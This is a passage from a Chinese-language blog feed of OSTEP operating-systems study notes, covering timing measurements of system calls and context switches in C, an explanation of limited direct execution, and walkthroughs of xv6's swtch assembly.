: : : &quot;memory&quot;);</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period2 = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period2/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, (period2 - period)/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; <span class="keyword">while</span> <span class="literal">true</span> ;taskset -c <span class="number">1</span> sudo ./test;end</span><br><span class="line"><span class="number">35475179</span></span><br><span class="line"><span class="number">35475567</span></span><br><span class="line"><span class="number">387</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35475595</span></span><br><span class="line"><span class="number">35475995</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476026</span></span><br><span class="line"><span class="number">35476421</span></span><br><span class="line"><span class="number">395</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476449</span></span><br><span class="line"><span class="number">35476848</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476881</span></span><br><span class="line"><span class="number">35477275</span></span><br><span class="line"><span class="number">393</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35477304</span></span><br><span class="line"><span class="number">35477695</span></span><br><span class="line"><span class="number">390</span></span><br><span class="line">-----------</span><br><span class="line">^C⏎ </span><br></pre></td></tr></table></figure><p>如果想要一个准确时间可以用clock_gettime，会比gettimeofday准一点,gettimeofday和clock_gettime函数返回的是当前系统时钟的时间值，而不是指令的执行时间，所以没用barrier来防止乱序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start_time</span>, <span class="title">end_time</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct timespec &#123;</span></span><br><span class="line"><span class="comment">    time_t tv_sec;  // 秒</span></span><br><span class="line"><span class="comment">    long tv_nsec;   // 纳秒</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">    <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec)/<span class="number">1000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/6 [SIGINT]&gt; gcc -g -o  test test.c</span><br><span class="line">grxer@grxer ~/D/s/O/o/6&gt; while true ;taskset -c 1 sudo ./test;end</span><br><span class="line">ns:127.141074</span><br><span class="line">us:0.127141</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:127.567767</span><br><span class="line">us:0.127568</span><br><span class="line">ms:0.000128</span><br><span class="line">ns:126.079839</span><br><span class="line">us:0.126080</span><br><span class="line">ms:0.000126</span><br><span class="line">ns:127.143936</span><br><span class="line">us:0.127144</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:126.850415</span><br><span class="line">us:0.126850</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:121.985531</span><br><span class="line">us:0.121986</span><br><span class="line">ms:0.000122</span><br><span class="line">ns:119.445469</span><br><span class="line">us:0.119445</span><br><span class="line">ms:0.000119</span><br><span class="line">ns:119.942527</span><br><span class="line">us:0.119943</span><br><span class="line">ms:0.000120</span><br><span class="line">^C⏎   </span><br></pre></td></tr></table></figure><p>两种方式比较一下，看了下cpu主频<code>cpu MHz         : 3193.924</code> 那么一条指令周期1 &#x2F; 3193.924MHz &#x3D; 0.312975 ns，0.312975*395&#x3D;123.625125ns</p><p>两种方式相差无几</p><ol start="2"><li></li></ol><p>需要测量上下文切换成本，</p><p>需要把程序限制到一个cpu上做切换，这次我们用<code>sched_setaffinity</code>来实现绑定指定处理器而不是用taskset(PS:简单测试了一下fork子进程是会跑在父进程的cpu亲合力掩码)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sched_setaffinity</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">size_t</span> cpusetsize,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">cpu_set_t</span> *mask)</span>;</span><br><span class="line">pid为<span class="number">0</span>设置当前进程否则pid进程</span><br><span class="line">cpusetsize一般给<span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>)</span><br><span class="line">mask CPU位掩码 的操作</span><br><span class="line">CPU_ZERO()：清除集合的内容，让其不包含任何CPU。</span><br><span class="line"></span><br><span class="line">CPU_SET()：添加cpu到集合中。</span><br><span class="line"></span><br><span class="line">CPU_CLR()：从集合中移除cpu</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_ISSET</span><span class="params">()</span> ：测试cpu是否在集合中。</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_COUNT</span><span class="params">()</span>：返回集合中包含的CPU数量。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// exit</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> <span class="comment">// waitpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// fork, pipe, close, write, dup2</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> mask;</span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">3</span>, &amp;mask);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="type">pid_t</span> rc;</span><br><span class="line">    <span class="type">int</span> re = sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(mask), &amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == re) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setscheduler&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pipefd1[<span class="number">2</span>], pipefd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd1) &lt; <span class="number">0</span> || pipe(pipefd2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;;</span><br><span class="line">    rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;----------------------%d\n&quot;, i);</span></span><br><span class="line">            read(pipefd1[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">            write(pipefd2[<span class="number">1</span>], <span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> timespec start_time, end_time;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;+++++%d\n&quot;, i);</span></span><br><span class="line">            write(pipefd1[<span class="number">1</span>], <span class="string">&quot;0&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            read(pipefd2[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">        <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec) / <span class="number">1000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看你一些cpu affinity父子都绑定到了8(100)就是我们的设置的第三个cpu<code>    CPU_SET(3, &amp;mask);</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~&gt; ps -a</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">   2677 pts/12   00:00:04 fish</span><br><span class="line">   8612 tty2     00:00:00 gnome-session-b</span><br><span class="line">   9251 pts/13   00:00:00 tmux: client</span><br><span class="line">   9276 pts/14   00:00:00 fish</span><br><span class="line">   9316 pts/15   00:00:00 fish</span><br><span class="line">  36681 pts/14   00:00:01 gdb</span><br><span class="line">  36697 pts/14   00:00:00 test &lt;defunct&gt;</span><br><span class="line">  48284 pts/23   00:00:00 fish</span><br><span class="line">  50253 pts/24   00:00:00 fish</span><br><span class="line">  54215 pts/38   00:00:02 2</span><br><span class="line">  54216 pts/38   00:00:02 2</span><br><span class="line">  54309 pts/24   00:00:00 ps</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54216</span><br><span class="line">pid 54216&#x27;s current affinity mask: 8</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54215</span><br><span class="line">pid 54215&#x27;s current affinity mask: 8</span><br></pre></td></tr></table></figure><p>交替阻塞，交替上下文切换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span> [SIGINT]&gt; gcc -g -o <span class="number">2</span> <span class="number">2.</span>c</span><br><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; ./<span class="number">2</span></span><br><span class="line">ns:<span class="number">4238.650005</span></span><br><span class="line">us:<span class="number">4.238650</span></span><br><span class="line">ms:<span class="number">0.004239</span></span><br></pre></td></tr></table></figure><p>这个时间应该再需要减去两次写入，两次读取时间，懒得搞了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution</title>
      <link href="/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<h1 id="Mechanism-Limited-Direct-Execution"><a href="#Mechanism-Limited-Direct-Execution" class="headerlink" title="Mechanism:Limited Direct Execution"></a>Mechanism:Limited Direct Execution</h1><h2 id="受限制的操作"><a href="#受限制的操作" class="headerlink" title="受限制的操作"></a>受限制的操作</h2><p>进程跑在我们的操作系统上，总不能让他为所欲为吧，cpu提供给了我们保护模式，从而有了用户模式和内核模式，我们的操作系统运行在内核模式，可以访问机器全部资源，用户进程运行在用户模式，受到限制，但是用户程序有时必须做一些特权操作，操作系统就必须提供给他们一些接口:系统调用。</p><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。陷阱是有意的异常,陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口系统调用，在 x86-64系统上，系统调用是通过一条称为 syscall的陷阱指令来提供的</p><p>加电开机后，处于内核模式，操作系统内核会告诉硬件我们的陷阱处理程序(陷阱表)在哪，执行陷阱处理程序前，<strong>处理器</strong>会把进程的一些寄存器值等压到该进程内核栈(在我们32位程序进程说的高1G内核空间里，在x86的32位机器上内核栈大小可以为4KB或8KB)，执行完陷阱返回时再弹出</p><h2 id="在进程之间切换"><a href="#在进程之间切换" class="headerlink" title="在进程之间切换"></a>在进程之间切换</h2><p>操作系统如何重新获得 CPU 的控制权</p><h3 id="协作方式-等待系统调用"><a href="#协作方式-等待系统调用" class="headerlink" title="协作方式:等待系统调用"></a>协作方式:等待系统调用</h3><p>程序主动进行系统调用或其他类型的异常来重新获取控制权</p><h3 id="非协作方式：操作系统进行控制"><a href="#非协作方式：操作系统进行控制" class="headerlink" title="非协作方式：操作系统进行控制"></a>非协作方式：操作系统进行控制</h3><p>协作方式对于一些只循环的程序无能为力，那就用硬件中断</p><p>利用时钟设备，每隔几毫秒产生一次中断，中断处理程序前，<strong>处理器</strong>也会把一些当前进程信息压入其内核栈</p><h3 id="保存和恢复上下文"><a href="#保存和恢复上下文" class="headerlink" title="保存和恢复上下文"></a>保存和恢复上下文</h3><p>接下来就是<strong>调度程序</strong>根据调度策略决定怎么跑路Zzz</p><p>决定切换的话，会进行上下文切换(context switch)</p><p>假如由A切换到B</p><p>A的寄存器首先被硬件保存到该进程的内核栈，进入内核态，操作系统切换时，调用switch再次把寄存器保存到操作系统维持的<strong>A的进程结构体的内存</strong>里，然后把<strong>要调度B进程结构体的内存里的值</strong>恢复到寄存器，这个时候栈指针已经变为了B的内核栈，从内核栈恢复寄存器就是恢复B的寄存器了，就可以把之前硬件保存的B进程的东西恢复，回到用户模式执行B的指令</p><h4 id="xv6上下文切换源码"><a href="#xv6上下文切换源码" class="headerlink" title="xv6上下文切换源码"></a>xv6上下文切换源码</h4><p>书里的代码有错误，去找了波源码 <a href="https://github.com/mit-pdos/xv6-public">https://github.com/mit-pdos/xv6-public</a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#   void swtch(struct context *old, struct context *new);</span><br><span class="line">#  </span><br><span class="line"># Save current register context in old</span><br><span class="line"># and then load register context from new.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  # Save old registers</span><br><span class="line">  movl 4(%esp), %eax</span><br><span class="line"></span><br><span class="line">  popl 0(%eax)  # %eip</span><br><span class="line">  movl %esp, 4(%eax)</span><br><span class="line">  movl %ebx, 8(%eax)</span><br><span class="line">  movl %ecx, 12(%eax)</span><br><span class="line">  movl %edx, 16(%eax)</span><br><span class="line">  movl %esi, 20(%eax)</span><br><span class="line">  movl %edi, 24(%eax)</span><br><span class="line">  movl %ebp, 28(%eax)</span><br><span class="line"></span><br><span class="line">  # Load new registers</span><br><span class="line">  movl 4(%esp), %eax  # not 8(%esp) - popped return address above</span><br><span class="line"></span><br><span class="line">  movl 28(%eax), %ebp</span><br><span class="line">  movl 24(%eax), %edi</span><br><span class="line">  movl 20(%eax), %esi</span><br><span class="line">  movl 16(%eax), %edx</span><br><span class="line">  movl 12(%eax), %ecx</span><br><span class="line">  movl 8(%eax), %ebx</span><br><span class="line">  movl 4(%eax), %esp</span><br><span class="line">  pushl 0(%eax)  # %eip</span><br><span class="line"></span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the %fs etc. segment registers,</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Save all the regular registers so we don&#x27;t need to care</span></span><br><span class="line"><span class="comment">// which are caller save, but not the return register %eax.</span></span><br><span class="line"><span class="comment">// (Not saving %eax just simplifies the switching code.)</span></span><br><span class="line"><span class="comment">// The layout of context must match code in swtch.S.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> eip;</span><br><span class="line">  <span class="type">int</span> esp;</span><br><span class="line">  <span class="type">int</span> ebx;</span><br><span class="line">  <span class="type">int</span> ecx;</span><br><span class="line">  <span class="type">int</span> edx;</span><br><span class="line">  <span class="type">int</span> esi;</span><br><span class="line">  <span class="type">int</span> edi;</span><br><span class="line">  <span class="type">int</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据函数声明和32位压栈规则，栈刚开始是这样的</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>movl 4(%esp), %eax</code>把old(*)给eax</p><p><code>popl 0(%eax)把eip寄存器给到old-&gt;eip</code></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+ </span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+</span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p>后面一直到<code>movl %ebp, 28(%eax)</code>把old的context结构体里内容填满</p><p><code>movl 4(%esp), %eax</code>把新的context地址给到eax</p><p>一直到<code>movl 4(%eax), %esp</code>把新context里的内容恢复到寄存器</p><p>可以看的栈帧寄存器ebp，esp都变了，切换到了B内核栈</p><p><code> pushl 0(%eax)  # %eip</code>把newb-&gt;eip压栈</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br><span class="line">|              | </span><br><span class="line">+--------------+ </span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><h5 id="新版"><a href="#新版" class="headerlink" title="新版"></a>新版</h5><p>其实上面是比较早版本的swtch，最新的已经变了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PAGEBREAK: 17</span></span><br><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the segment registers (%cs, etc),</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save %eax, %ecx, %edx, because the</span></span><br><span class="line"><span class="comment">// x86 convention is that the caller has saved them.</span></span><br><span class="line"><span class="comment">// Contexts are stored at the bottom of the stack they</span></span><br><span class="line"><span class="comment">// describe; the stack pointer is the address of the context.</span></span><br><span class="line"><span class="comment">// The layout of the context matches the layout of the stack in swtch.S</span></span><br><span class="line"><span class="comment">// at the &quot;Switch stacks&quot; comment. Switch doesn&#x27;t save eip explicitly,</span></span><br><span class="line"><span class="comment">// but it is on the stack and allocproc() manipulates it.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint edi;</span><br><span class="line">  uint esi;</span><br><span class="line">  uint ebx;</span><br><span class="line">  uint ebp;</span><br><span class="line">  uint eip;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Context <span class="keyword">switch</span></span><br><span class="line">#</span><br><span class="line"><span class="meta">#   void swtch(struct context **old, struct context *new);</span></span><br><span class="line"># </span><br><span class="line"># Save the current registers on the <span class="built_in">stack</span>, creating</span><br><span class="line"><span class="meta"># a struct context, and save its address in *old.</span></span><br><span class="line"># Switch stacks to new and pop previously-saved registers.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">  movl <span class="number">8</span>(%esp), %edx</span><br><span class="line"></span><br><span class="line">  # Save old callee-saved registers</span><br><span class="line">  pushl %ebp</span><br><span class="line">  pushl %ebx</span><br><span class="line">  pushl %esi</span><br><span class="line">  pushl %edi</span><br><span class="line"></span><br><span class="line">  # Switch stacks</span><br><span class="line">  movl %esp, (%eax)</span><br><span class="line">  movl %edx, %esp</span><br><span class="line"></span><br><span class="line">  # Load new callee-saved registers</span><br><span class="line">  popl %edi</span><br><span class="line">  popl %esi</span><br><span class="line">  popl %ebx</span><br><span class="line">  popl %ebp</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code> movl 4(%esp), %eax   movl 8(%esp), %edx</code></p><p>old(**)给到eax</p><p>new(*)给到edx</p><p>然后直接把context push到栈上</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;--<span class="comment">%eax</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;--<span class="comment">%edx</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>  movl %esp, (%eax)</code></p><p>直接把当前esp指向的地址写到oldA的context的地址，就是把栈上的这些当作context结构体，没去再去单独申请内存，为了提高效率??</p><p><code>movl %edx, %esp</code></p><p>把栈切换到NewB的内核栈,由于之前B也被切换过所以他的栈顶也是context结构体</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br></pre></td></tr></table></figure><p>pop后ret就可以切换到B指令执行</p><h3 id="并发问题！！！"><a href="#并发问题！！！" class="headerlink" title="并发问题！！！"></a>并发问题！！！</h3><p>系统调用时发生时钟中断?</p><p>中断处理时发生中断?</p><p>简单的在中断时禁止中断可能会导致中断丢失?</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API Homework</title>
      <link href="/2023/04/12/OSTEP-homework-5-Process-API/"/>
      <url>/2023/04/12/OSTEP-homework-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="Process-API-Homework"><a href="#Process-API-Homework" class="headerlink" title="Process API Homework"></a>Process API Homework</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">GCCFLAGS= -g -Wall</span><br><span class="line">TARGET = <span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span></span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span>.c</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(SRC)</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$(SRC)</span> -o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="type">pid_t</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">        x = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 